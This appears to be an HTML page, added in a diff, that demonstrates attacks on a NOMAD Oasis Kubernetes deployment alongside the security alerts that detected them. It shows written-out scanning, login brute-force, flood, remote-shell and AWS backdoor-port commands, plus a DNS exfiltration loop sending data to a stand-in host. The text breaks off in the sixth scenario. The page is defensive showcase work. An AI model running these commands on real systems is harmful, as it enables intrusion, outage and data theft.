@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UATMS — Attack Scenarios</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0d1117;
+      color: #e6edf3;
+      line-height: 1.7;
+    }
+
+    header {
+      background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
+      border-bottom: 1px solid #30363d;
+      padding: 48px 40px 40px;
+      text-align: center;
+    }
+
+    header h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #f0f6fc;
+      letter-spacing: -0.5px;
+    }
+
+    header p {
+      margin-top: 10px;
+      color: #8b949e;
+      font-size: 1rem;
+    }
+
+    .badge {
+      display: inline-block;
+      background: #1f2937;
+      border: 1px solid #374151;
+      border-radius: 6px;
+      padding: 3px 10px;
+      font-size: 0.75rem;
+      color: #9ca3af;
+      margin-top: 14px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    main {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 48px 24px;
+    }
+
+    .scenario {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      margin-bottom: 56px;
+      overflow: hidden;
+    }
+
+    .scenario-header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 24px 28px;
+      border-bottom: 1px solid #30363d;
+      background: #0d1117;
+    }
+
+    .scenario-number {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+
+    .s1 .scenario-number { background: #1a2e1a; color: #3fb950; border: 2px solid #238636; }
+    .s2 .scenario-number { background: #2a1f1a; color: #f0883e; border: 2px solid #9a5c2a; }
+    .s3 .scenario-number { background: #2a1a1a; color: #f85149; border: 2px solid #6e2d2d; }
+    .s4 .scenario-number { background: #1f1a2e; color: #a371f7; border: 2px solid #6e40c9; }
+    .s5 .scenario-number { background: #0e2233; color: #39d3f0; border: 2px solid #1b6e7a; }
+    .s6 .scenario-number { background: #2e2209; color: #e3b341; border: 2px solid #9e6a03; }
+
+    .scenario-header h2 {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #f0f6fc;
+    }
+
+    .scenario-header .subtitle {
+      font-size: 0.85rem;
+      color: #8b949e;
+      margin-top: 2px;
+    }
+
+    .scenario-body {
+      padding: 28px;
+    }
+
+    .section {
+      margin-bottom: 28px;
+    }
+
+    .section-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #8b949e;
+      margin-bottom: 10px;
+    }
+
+    .section p {
+      color: #c9d1d9;
+      font-size: 0.95rem;
+    }
+
+    .detection-box {
+      background: #0d1117;
+      border: 1px solid #238636;
+      border-left: 4px solid #3fb950;
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .detection-box .detection-title {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: #3fb950;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      margin-bottom: 10px;
+    }
+
+    .detection-box.purple {
+      border-color: #6e40c9;
+      border-left-color: #a371f7;
+    }
+    .detection-box.purple .detection-title { color: #a371f7; }
+
+    .detection-box.cyan {
+      border-color: #1b6e7a;
+      border-left-color: #39d3f0;
+    }
+    .detection-box.cyan .detection-title { color: #39d3f0; }
+
+    .detection-box.gold {
+      border-color: #9e6a03;
+      border-left-color: #e3b341;
+    }
+    .detection-box.gold .detection-title { color: #e3b341; }
+
+    .dot-purple { background: #a371f7; }
+    .dot-cyan   { background: #39d3f0; }
+    .dot-gold   { background: #e3b341; }
+
+    /* ── Wazuh log viewer ── */
+    .wazuh-log-wrap {
+      margin: 20px 0;
+    }
+
+    .wazuh-log {
+      background: #010409;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      overflow: hidden;
+      font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+      font-size: 0.78rem;
+      margin-bottom: 10px;
+    }
+
+    .wazuh-log-header {
+      background: #161b22;
+      border-bottom: 1px solid #30363d;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .wazuh-log-header .wh-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 0;
+    }
+
+    .wazuh-log-title {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: #c9d1d9;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .wl-level {
+      flex-shrink: 0;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.3px;
+    }
+
+    .wl-l8  { background: #1a2a1a; color: #3fb950; border: 1px solid #238636; }
+    .wl-l9  { background: #1a2a1a; color: #56d364; border: 1px solid #2ea043; }
+    .wl-l10 { background: #2a2518; color: #d29922; border: 1px solid #9e6a03; }
+    .wl-l11 { background: #2a1f10; color: #f0883e; border: 1px solid #9a5c2a; }
+    .wl-l12 { background: #2a1a1a; color: #f85149; border: 1px solid #6e2d2d; }
+    .wl-l13 { background: #2a1a1a; color: #ff7b72; border: 1px solid #8b2a2a; }
+    .wl-l14 { background: #300d0d; color: #ffa198; border: 1px solid #a62020; }
+
+    .wl-ts {
+      font-size: 0.68rem;
+      color: #484f58;
+      flex-shrink: 0;
+    }
+
+    .wazuh-log-body {
+      padding: 0;
+    }
+
+    .wl-row {
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      border-bottom: 1px solid #161b22;
+    }
+
+    .wl-row:last-child { border-bottom: none; }
+
+    .wl-key {
+      padding: 5px 14px;
+      color: #58a6ff;
+      background: #0d1117;
+      border-right: 1px solid #161b22;
+      word-break: break-all;
+    }
+
+    .wl-val {
+      padding: 5px 14px;
+      color: #c9d1d9;
+      word-break: break-all;
+    }
+
+    .wl-val.green  { color: #3fb950; }
+    .wl-val.red    { color: #f85149; }
+    .wl-val.yellow { color: #d29922; }
+    .wl-val.purple { color: #a371f7; }
+    .wl-val.cyan   { color: #39d3f0; }
+    .wl-val.blue   { color: #79c0ff; }
+    .wl-val.grey   { color: #8b949e; }
+
+    .wl-section {
+      padding: 4px 14px;
+      background: #0a0f14;
+      border-bottom: 1px solid #161b22;
+      color: #484f58;
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    .sigkill-badge {
+      display: inline-block;
+      background: #2a1a1a;
+      border: 1px solid #6e2d2d;
+      border-radius: 4px;
+      padding: 1px 7px;
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: #f85149;
+      margin-left: 6px;
+      letter-spacing: 0.3px;
+    }
+
+    .alert-line {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 8px;
+      font-size: 0.88rem;
+    }
+
+    .alert-line:last-child { margin-bottom: 0; }
+
+    .alert-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      margin-top: 6px;
+      flex-shrink: 0;
+    }
+
+    .dot-green { background: #3fb950; }
+    .dot-yellow { background: #d29922; }
+    .dot-red { background: #f85149; }
+
+    .alert-line strong { color: #f0f6fc; }
+    .alert-line span { color: #8b949e; }
+
+    .screenshot-section {
+      margin: 20px 0;
+    }
+
+    .screenshot-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #8b949e;
+      margin-bottom: 10px;
+    }
+
+    .screenshot-grid {
+      display: grid;
+      gap: 12px;
+    }
+
+    .screenshot-grid.cols-1 { grid-template-columns: 1fr; }
+    .screenshot-grid.cols-3 { grid-template-columns: repeat(3, 1fr); }
+
+    .screenshot-grid img {
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      display: block;
+    }
+
+    .screenshot-caption {
+      font-size: 0.75rem;
+      color: #6e7681;
+      text-align: center;
+      margin-top: 6px;
+    }
+
+    .impact-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px 20px;
+    }
+
+    .impact-box .impact-title {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: #f85149;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      margin-bottom: 12px;
+    }
+
+    .impact-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 8px;
+      font-size: 0.88rem;
+      color: #c9d1d9;
+    }
+
+    .impact-item:last-child { margin-bottom: 0; }
+
+    .impact-item::before {
+      content: '→';
+      color: #f85149;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #21262d;
+      margin: 20px 0;
+    }
+
+    .terminal {
+      background: #010409;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 20px 0;
+      font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+      font-size: 0.82rem;
+    }
+
+    .terminal-bar {
+      background: #161b22;
+      border-bottom: 1px solid #30363d;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .terminal-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .td-red    { background: #ff5f57; }
+    .td-yellow { background: #febc2e; }
+    .td-green  { background: #28c840; }
+
+    .terminal-title {
+      margin-left: 8px;
+      font-size: 0.75rem;
+      color: #8b949e;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+    }
+
+    .terminal-body {
+      padding: 16px 20px;
+      line-height: 1.9;
+    }
+
+    .terminal-body .prompt   { color: #3fb950; user-select: none; }
+    .terminal-body .cmd      { color: #e6edf3; }
+    .terminal-body .flag     { color: #79c0ff; }
+    .terminal-body .arg      { color: #ffa657; }
+    .terminal-body .output   { color: #8b949e; display: block; margin-top: 2px; }
+    .terminal-body .comment  { color: #484f58; }
+
+    .terminal-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #8b949e;
+      margin-bottom: 10px;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 640px) {
+      .screenshot-grid.cols-3 { grid-template-columns: 1fr; }
+      header { padding: 32px 20px 28px; }
+      .scenario-body { padding: 20px; }
+      .terminal-body { font-size: 0.72rem; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>UATMS — Attack Scenarios</h1>
+  <p>Ultra Advanced Threat Monitoring System &nbsp;·&nbsp; Big Chemistry</p>
+  <div class="badge">Network Attack Demonstrations</div>
+</header>
+
+<main>
+
+  <!-- SCENARIO 1 -->
+  <div class="scenario s1">
+    <div class="scenario-header">
+      <div class="scenario-number">1</div>
+      <div>
+        <h2>nmap — The Door Knocker</h2>
+        <div class="subtitle">Reconnaissance · Port Scan · OS Fingerprinting</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          John starts attacking from outside. Imagine your building has 65,000 doors.
+          John stands outside and knocks on every single one as fast as he can, trying to find which
+          ones open. He also sends a weird knock that only hackers use — a packet with both SYN and FIN
+          flags at the same time. No normal visitor ever does that.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Command</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">pentest-netshoot — kubectl exec</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">nmap </span><span class="flag">-sS -O </span><span class="arg">10.30.11.49</span><br>
+          <span class="output">Starting Nmap 7.98 at 2026-06-09 21:03 UTC</span>
+          <span class="output">PORT     STATE SERVICE</span>
+          <span class="output">22/tcp   open  ssh</span>
+          <span class="output">80/tcp   open  http</span>
+          <span class="output">Nmap done: 1 IP address scanned in 12.45 seconds</span>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">Wazuh Detects</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-yellow"></div>
+          <div><strong>Nmap OS Detection Probe</strong> <span>— SYN+FIN packet, window:1024 — Rule 100500 · Level 12</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-yellow"></div>
+          <div><strong>Port Scan Detected</strong> <span>— 20+ SYN packets in 5s · src 10.30.11.127 → dst 10.30.11.49 — Rule 100500 · Level 12</span></div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard</div>
+        <div class="screenshot-grid cols-1">
+          <div>
+            <img src="imgs/nmap_port_scan.png" alt="Wazuh alert — Port Scan Detected">
+            <div class="screenshot-caption">Port Scan Detected · Rule 100500 · Severity 2</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">If He Gets In</div>
+        <p>
+          He finds an open port and gets a foothold inside a pod. He starts mapping every service,
+          every version number, every reachable IP. He builds a list of known vulnerabilities
+          matching what he found — and picks his next target.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Attacker has a full map of your internal services — reconnaissance is step one of every real attack.</div>
+        <div class="impact-item">Exposed service versions can be matched against public CVE databases — John now has a shopping list.</div>
+        <div class="impact-item">If the scan goes unnoticed, the next alert is a compromise — not just a probe.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCENARIO 2 -->
+  <div class="scenario s2">
+    <div class="scenario-header">
+      <div class="scenario-number">2</div>
+      <div>
+        <h2>Directory Busting — The Corridor Crawler</h2>
+        <div class="subtitle">Web Enumeration · HTTP Brute Force · Credential Theft</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          John found the NOMAD Oasis web application. He runs a tool that fires hundreds of HTTP
+          requests per second, each guessing a different hidden URL: <code>/admin</code>, <code>/api/keys</code>,
+          <code>/backup.zip</code>, <code>/.env</code>, <code>/config</code>... He's trying every door on every
+          floor hoping one was left unlocked. He then hammers <code>/login</code> with credential combinations
+          until something works.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Command</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">pentest-netshoot — kubectl exec</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">gobuster dir </span><span class="flag">-u </span><span class="arg">http://10.30.11.49 </span><span class="flag">-w </span><span class="arg">common.txt </span><span class="flag">-t </span><span class="arg">50</span><br>
+          <span class="output">/admin        (Status: 403)</span>
+          <span class="output">/login        (Status: 200) &lt;-- found</span>
+          <span class="output">/api/v1       (Status: 200) &lt;-- found</span><br>
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">for i in </span><span class="arg">$(seq 1 20)</span><span class="cmd">; do curl </span><span class="flag">-s -X POST </span><span class="arg">http://10.30.11.49/login </span><span class="flag">-d </span><span class="arg">"user=admin&amp;pass=test$i"</span><span class="cmd"> &amp; done; wait</span>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">Wazuh Detects</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-yellow"></div>
+          <div><strong>HTTP Login Brute Force</strong> <span>— 10+ POST /login in 30s · src 10.30.11.127 → dst 10.30.11.49 — Rule 100500 · Level 12</span></div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard</div>
+        <div class="screenshot-grid cols-1">
+          <div>
+            <img src="imgs/dir_busting_brute_force.png" alt="Wazuh alert — HTTP Login Brute Force">
+            <div class="screenshot-caption">HTTP Login Brute Force · Rule 100500 · POST /login · Severity 2</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">If He Gets In</div>
+        <p>
+          He finds an exposed API endpoint without authentication. He downloads all scientific datasets
+          stored in NOMAD Oasis without a password, and searches the responses for API keys or credentials
+          accidentally left in a config file.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Years of proprietary research data stolen in minutes.</div>
+        <div class="impact-item">If credentials are found in an exposed config, the entire cluster is at risk.</div>
+        <div class="impact-item">GDPR violation if personal data was in those datasets — regulatory fines follow.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCENARIO 3 -->
+  <div class="scenario s3">
+    <div class="scenario-header">
+      <div class="scenario-number">3</div>
+      <div>
+        <h2>DDoS — The Mob at the Door</h2>
+        <div class="subtitle">SYN Flood · UDP Flood · ICMP Flood · Denial of Service</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          This time John doesn't want to sneak in — he just wants to break things. He rents a botnet
+          of thousands of infected computers and tells all of them to flood your servers at once.
+          Three waves hit simultaneously: a <strong>SYN flood</strong> that fills your server's memory with
+          half-open connections, a <strong>UDP flood</strong> that wastes all its CPU, and an
+          <strong>ICMP flood</strong> that saturates the network pipe entirely.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Commands</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">pentest-netshoot — kubectl exec</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">nping </span><span class="flag">--tcp -p 80 --flood --count </span><span class="arg">2000 </span><span class="arg">10.30.11.49</span><br>
+          <span class="output">Sent 2000 packets in 0.43 seconds | 4651.16 pkts/sec</span><br>
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">nping </span><span class="flag">--udp -p 53 --flood --count </span><span class="arg">2000 </span><span class="arg">10.30.11.49</span><br>
+          <span class="output">Sent 2000 packets in 0.39 seconds | 5128.21 pkts/sec</span><br>
+          <span class="prompt">attacker@pentest-netshoot:~$ </span><span class="cmd">nping </span><span class="flag">--icmp --flood --count </span><span class="arg">1000 </span><span class="arg">10.30.11.49</span><br>
+          <span class="output">Sent 1000 packets in 0.21 seconds | 4761.90 pkts/sec</span>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">Wazuh Detects — All Three Simultaneously</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div><strong>SYN Flood DDoS</strong> <span>— 1000+ SYN/5s · TCP · src 10.30.11.127 — Rule 100500 · Level 12 · Severity 1</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div><strong>UDP Flood DDoS</strong> <span>— 1000+ UDP/5s · port 53 · src 10.30.11.127 — Rule 100500 · Level 12 · Severity 1</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div><strong>ICMP Flood DDoS</strong> <span>— 500+ echo/5s · src 10.30.11.127 — Rule 100500 · Level 12 · Severity 1</span></div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard</div>
+        <div class="screenshot-grid cols-3">
+          <div>
+            <img src="imgs/ddos_syn_flood.png" alt="Wazuh alert — SYN Flood DDoS">
+            <div class="screenshot-caption">SYN Flood · TCP</div>
+          </div>
+          <div>
+            <img src="imgs/ddos_udp_flood.png" alt="Wazuh alert — UDP Flood DDoS">
+            <div class="screenshot-caption">UDP Flood · port 53</div>
+          </div>
+          <div>
+            <img src="imgs/ddos_icmp_flood.png" alt="Wazuh alert — ICMP Flood DDoS">
+            <div class="screenshot-caption">ICMP Flood</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">The Impact — No Break-In Needed</div>
+        <p>
+          A DDoS doesn't need to get inside. The goal is simply to make everything unavailable.
+          Scientists can't access their data. Uploads fail. The platform goes offline completely.
+          And while your team is responding to the flood — John's real attack may be happening
+          somewhere else, quietly.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Full service outage — NOMAD Oasis is unreachable for all users.</div>
+        <div class="impact-item">AWS data transfer costs spike massively absorbing the flood traffic.</div>
+        <div class="impact-item">DDoS is often a smokescreen — the real attack happens while your team is distracted.</div>
+      </div>
+
+    </div>
+  </div>
+
+
+  <!-- SCENARIO 4 -->
+  <div class="scenario s4">
+    <div class="scenario-header">
+      <div class="scenario-number">4</div>
+      <div>
+        <h2>Container Shell Spawn — The Ghost Inside</h2>
+        <div class="subtitle">Runtime Detection · Falco · Tetragon eBPF Enforcement</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          John exploits a vulnerability in the NOMAD web application and gets remote code execution.
+          He opens an interactive shell inside the running container — like finding a hidden hatch
+          inside one of the rooms and climbing through it. From there he tries to run
+          <code>nmap</code> to scan the internal network and plan his next move.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Command</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">john@attacker — remote exploit shell</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">john@attacker:~$ </span><span class="cmd">curl </span><span class="flag">-s </span><span class="arg">http://10.30.11.49/api/rce </span><span class="flag">--data </span><span class="arg">"cmd=bash -i"</span><br>
+          <span class="output">root@nomad-oasis-app:/# </span><br>
+          <span class="prompt">root@nomad-oasis-app:/# </span><span class="cmd">nmap </span><span class="flag">-sS </span><span class="arg">10.30.10.0/24</span><br>
+          <span class="output">Killed</span>
+        </div>
+      </div>
+
+      <div class="detection-box purple">
+        <div class="detection-title">Falco Detects — Rule 100600 · Level 13 · Critical</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-purple"></div>
+          <div><strong>Terminal shell in container</strong> <span>— bash spawned with TTY · pod nomad-oasis/nomad-oasis-app · MITRE T1059</span></div>
+        </div>
+      </div>
+
+      <div class="detection-box purple" style="margin-top:10px">
+        <div class="detection-title">Tetragon Detects — Rules 100702 &amp; 100700 · Level 11–14</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-purple"></div>
+          <div><strong>Shell spawned in container</strong> <span>— binary=/usr/bin/bash · pod nomad-oasis/nomad-oasis-app — Rule 100702 · Level 11</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div>
+            <strong>Malicious tool execution blocked</strong>
+            <span class="sigkill-badge">SIGKILL</span>
+            <span> — binary=/usr/bin/nmap · killed before first packet sent — Rule 100700 · Level 14</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard — Security Events</div>
+
+        <div class="screenshot-grid cols-1">
+            <div>
+              <img src="imgs/falco_shell_in_container.png" alt="Falco — Terminal shell in container">
+              <div class="screenshot-caption">Falco · Rule 100600 · Level 13 — Terminal shell in container</div>
+            </div>
+            <div>
+              <img src="imgs/tetragon_shell_spawn.png" alt="Tetragon — Shell spawned in container">
+              <div class="screenshot-caption">Tetragon · Rule 100702 · Level 11 — Shell spawned in container</div>
+            </div>
+            <div>
+              <img src="imgs/tetragon_sigkill_nmap.png" alt="Tetragon — SIGKILL nmap">
+              <div class="screenshot-caption">Tetragon · Rule 100700 · Level 14 — nmap blocked with SIGKILL</div>
+            </div>
+          </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">If He Gets Further</div>
+        <p>
+          With a shell inside the pod, John can read application secrets, environment variables,
+          and mounted files. He can try to escalate privileges by calling <code>nsenter</code>
+          or <code>setuid</code> to break out of the container entirely and reach the underlying node.
+          Tetragon watches every syscall and fires a privilege escalation alert the instant he tries.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Application secrets and database credentials read directly from container memory.</div>
+        <div class="impact-item">Container escape gives access to the underlying EKS node and every other pod on it.</div>
+        <div class="impact-item">Even if nmap is killed instantly by Tetragon, the shell itself is the foothold for everything else.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCENARIO 5 -->
+  <div class="scenario s5">
+    <div class="scenario-header">
+      <div class="scenario-number">5</div>
+      <div>
+        <h2>DNS Exfiltration — The Whispering Thief</h2>
+        <div class="subtitle">Data Exfiltration · Zeek Network Monitoring · MISP Intel</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          John is inside a pod and has stolen research data, but every direct connection to the
+          internet is blocked by Cilium. So he gets clever. He encodes the stolen data in
+          base64, splits it into tiny chunks, and hides each piece inside a DNS query —
+          like smuggling letters out of a building by writing them on the back of postcards.
+          DNS looks like normal web traffic, so it often slips through.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Command</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">root@nomad-oasis-app — inside compromised pod</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">root@nomad-oasis-app:/# </span><span class="cmd">cat </span><span class="arg">research_data.zip </span><span class="cmd">| base64 | fold </span><span class="flag">-w </span><span class="arg">30 </span><span class="cmd">| while read chunk; do</span><br>
+          <span class="prompt">&gt; </span><span class="cmd">  dig </span><span class="arg">${chunk}</span><span class="cmd">.exfil.</span><span class="arg">evil-c2.xyz</span><span class="cmd">; done</span><br>
+          <span class="output">; &lt;&lt;&gt;&gt; DiG &lt;&lt;&gt;&gt; aGVsbG8gd29ybGQ.exfil.evil-c2.xyz</span>
+          <span class="output">; &lt;&lt;&gt;&gt; DiG &lt;&lt;&gt;&gt; dGhpcyBpcyBzdG9s.exfil.evil-c2.xyz</span>
+          <span class="output">; &lt;&lt;&gt;&gt; DiG &lt;&lt;&gt;&gt; ZW4gcmVzZWFyY2g.exfil.evil-c2.xyz</span>
+        </div>
+      </div>
+
+      <div class="detection-box cyan">
+        <div class="detection-title">Zeek Detects — Rules 100700 &amp; 100701 · Level 8–13</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-cyan"></div>
+          <div><strong>Zeek Notice — DNS exfiltration pattern</strong> <span>— hundreds of queries to *.exfil.evil-c2.xyz in seconds — Rule 100701 · Level 8</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div><strong>Zeek Intel hit — MISP IOC match</strong> <span>— evil-c2.xyz matches threat intel feed · indicator_type=domain — Rule 100700 · Level 13</span></div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard — Security Events</div>
+
+        <div class="screenshot-grid cols-1">
+            <div>
+              <img src="imgs/zeek_dns_tunneling.png" alt="Zeek — DNS Tunneling">
+              <div class="screenshot-caption">Zeek · Rule 100701 · Level 8/13 — DNS Tunneling + MISP Intel hit</div>
+            </div>
+          </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">If He Gets the Data Out</div>
+        <p>
+          John now has a copy of years of scientific research on his machine. The data left the
+          building through a channel that looked like normal web traffic. Without Zeek watching
+          DNS at this level of detail, the exfiltration would be invisible.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Intellectual property stolen through a channel most firewalls don't inspect.</div>
+        <div class="impact-item">If the C2 domain is in MISP's threat feed, Zeek flags the match in real time — even before the data leaves.</div>
+        <div class="impact-item">Regulatory breach — data exfiltration triggers mandatory GDPR notification within 72 hours.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCENARIO 6 -->
+  <div class="scenario s6">
+    <div class="scenario-header">
+      <div class="scenario-number">6</div>
+      <div>
+        <h2>Cloud Backdoor — The Invisible Admin</h2>
+        <div class="subtitle">AWS CloudTrail · IAM Abuse · Security Group Tampering</div>
+      </div>
+    </div>
+    <div class="scenario-body">
+
+      <div class="section">
+        <div class="section-label">The Attack</div>
+        <p>
+          John doesn't touch the application at all this time. He found leaked AWS credentials
+          and goes straight to the AWS control panel. First he opens a secret backdoor port in
+          the firewall so he can connect directly to any server. Then he checks which IAM roles
+          have admin access — and tries to disable GuardDuty so AWS stops watching him.
+        </p>
+      </div>
+
+      <div class="terminal-label">Attack Commands</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dot td-red"></div>
+          <div class="terminal-dot td-yellow"></div>
+          <div class="terminal-dot td-green"></div>
+          <div class="terminal-title">john@attacker — AWS CLI with stolen credentials</div>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">john@attacker:~$ </span><span class="cmd">aws ec2 authorize-security-group-ingress </span><span class="flag">--group-id </span><span class="arg">sg-0750d7d810abeabb4 </span><span class="flag">--protocol </span><span class="arg">tcp </span><span class="flag">--port </span><span class="arg">31337 </span><span class="flag">--cidr </span><span class="arg">0.0.0.0/0</span><br>
+          <span class="output">{}</span><br>
